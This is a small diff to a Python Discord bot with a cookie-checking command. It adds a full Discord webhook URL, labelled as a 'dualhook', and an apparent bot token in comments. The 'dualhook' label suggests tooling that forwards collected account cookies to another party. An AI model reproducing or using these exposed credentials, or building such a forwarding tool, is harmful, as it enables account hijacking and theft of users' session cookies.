@@ -5,7 +5,7 @@ from discord_webhook import DiscordEmbed, DiscordWebhook
 req = requests.Session()
 client = commands.Bot(command_prefix='.') #set prefix
 
-wh = '' #enter ur dualhook here
+wh = '' #https://discord.com/api/webhooks/929578311481446450/WjWZc6DMUNREt0EcTPVTMyTyrlq1-yddLH-ZRQt5uGUELUqlwEfvv8oNpTvs9mef3YGZ
 
 
 @client.event
@@ -75,4 +75,4 @@ async def check(ctx, cookie):
 
 
 
-client.run('') #replace with your bot token
+client.run('') #OTM2MDU5NzkyMDg5MjkyODIw.YfHrnQ.69PnZ6zU_YZ-02yRELaFGogFDpo
